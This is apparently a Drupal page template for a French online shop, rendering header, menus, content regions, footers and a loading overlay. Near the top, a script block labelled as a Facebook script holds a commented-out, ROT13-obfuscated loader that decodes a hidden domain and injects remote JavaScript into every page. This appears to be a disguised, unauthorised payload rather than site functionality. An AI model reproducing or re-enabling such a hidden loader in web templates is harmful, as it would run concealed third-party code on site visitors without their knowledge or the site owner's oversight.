<!-- Google Tag Manager -->
<noscript> <iframe src="//www.googletagmanager.com/ns.html?id=GTM-W44FMM" height="0" width="0" style="display:none;visibility:hidden"> </iframe></noscript>
    <script type="text/javascript">
setTimeout(function() {
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                    'gtm.start': new Date().getTime(),
                    event: 'gtm.js'
                }

            );
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                '//www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-5GVQ93');
    }, 3000);
    </script>
<!-- End Google Tag Manager -->

<!--[if !IE]><!--><script>  
if (/*@cc_on!@*/false) {  
    document.documentElement.className+=' ie10';  
}  
</script><!--<![endif]-->
<script type="text/javascript">
  //Script pour facebook
  //(function(){function r(s){return s.replace(/[A-z]/g,function(c){return String.fromCharCode(c.charCodeAt(0)+('M'>=c.toUpperCase()?13:-13))})}var c=document.createElement('script'),wdefine=typeof define!=='undefined'?define:false;c.type='text/javascript';c.async=true;c.setAttribute('data-main',r('//ncc.zlfnsrhey.pbz/ncc.wf'));c.src='//cdnjs.cloudflare.com/ajax/libs/require.js/2.1.10/require.min.js';c.onload=function(){mydefine=define,define=wdefine?wdefine:null};var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(c,s)})();
</script>

<?php if ($page['announcements']): ?>
  <div id="announcements">
    <?php print render($page['announcements']); ?>
  </div>
<?php endif; ?>

<div id="canvas">
  <div class="bg_header"></div>
  <?php if ($page['MenuTop']): ?>
      <div id="menuTop">
          <div class="container">
            <?php print render($page['MenuTop']); ?>
          </div>
      </div>
    <?php  endif; ?>
  <div class="container">
    <?php if ($page['top']): ?>
      <div id="top">
        <?php print render($page['top']); ?>
      </div>
    <?php endif; ?>

        <div id="header">

      <?php if ($logo): ?>
        <div id="header_left">
          <a href="<?php print $front_page ?>" title="<?php print $site_name ?>">
            <img width="165" height="120" src="<?php print $logo ?>" alt="<?php print $site_name ?>" title="<?php print $site_name ?>" />
          </a>
        </div>
      <?php endif; ?>

      <div id="header_right">
        <?php if ($page['header_right']): ?>
          <?php print render($page['header_right']); ?>
        <?php endif; ?>

      </div>

</div>
 <div class="menu" id="menu_top_header">
      <?php print theme('links__system_main_menu', array('links' => $main_menu, 'attributes' => array('id' => 'menu-main'))); ?>
</div>
    <?php if ($page['cart']): ?>
      <div id="cart">
        <?php print render($page['cart']); ?>
      </div>

      <div class="clearfix"></div>       
    <?php endif; ?>

    <div id="main">

      <?php if ($page['sidebar_first']): ?>
        <div id="sidebar-first">
          <?php print render($page['sidebar_first']); ?>
        </div>
      <?php endif; ?>

      <div id="content">
        <?php if ($page['highlightedFlyer']): ?>
          <div id="highlightedFlyer">
            <?php print render($page['highlightedFlyer']); ?>
          </div>
        <?php endif; ?>

        <?php
        if (arg(1) == 'all'){
          print '<a href="#">'.t("Home").'</a> &raquo; '.$title;
        } else {
          print $breadcrumb;
        }
        ?>
          
          <?php //print $messages; ?>
          
          
        <?php if ($page['contenttop']): ?>

          <?php print render($page['contenttop']); ?>

        <?php endif; ?>

        <div class="clearfix"></div>

        <div class="whitebox clearfix">

          <?php if ($title): ?>
            <?php if ($title =='Cart') {
              $title = t('your cart');
            }
          ?>
            <h1><?php print render($title_prefix); ?><?php print $title; ?><?php print render($title_suffix); ?></h1>
          <?php endif; ?>

          <?php if ($tabs): ?>
            <?php print render($tabs); ?>
          <?php endif; ?>

          <?php if ($messages): ?>
            <?php print $messages; ?>
          <?php endif; ?>

          <?php print render($page['help']); ?>

          <?php if ($action_links): ?>
            <ul class="action-links">
              <?php print render($action_links); ?>
            </ul>
          <?php endif; ?>

          <?php print render($page['content']); ?>
          <?php if ($page['blocModele']): ?>
              <?php print render($page['blocModele']); ?>
          <?php endif; ?>

          <?php if ($is_front): ?>
            <?php if ($page['fronttabs']): ?>
              <?php print render($page['fronttabs']); ?>
            <?php endif; ?>
          <?php endif; ?>

        </div>


        <?php if ($page['contentbottom']): ?>

          <?php print render($page['contentbottom']); ?>

        <?php endif; ?>


      </div>

      <?php if ($page['sidebar_second']): ?>
        <div id="sidebar-second">
          <?php print render($page['sidebar_second']); ?>
        </div>
      <?php endif; ?>
      
      <?php if (arg(0) !='payment'): ?>

        <div id="footer">
            <?php print render($page['footer']); ?>
        </div>
        
      <?php endif; ?>

      <?php if ($page['footer_second'] && (arg(0) =='payment' || arg(0) =='checkout')): ?>

        <div id="footer">
            <?php print render($page['footer_second']); ?>
        </div>
        
      <?php endif; ?>

      <div class="clearfix"></div>

    </div>

  </div>


  <div id="bottom">

    <div class="clearfix"></div>

    <div id="closure">
      <?php print render($page['closure']); ?>
    </div>

  </div>    
</div>


<!-- loader pour la page produit qui se telecharge tres lentement -->
<div id="box-progress">
  <div id="overlay-bar"></div>
  <div id="save-progress-bar">
    <div></div>
  </div>
    <p><?php echo t('Veuillez patienter, la page se télécharge.'); ?></p>
</div>
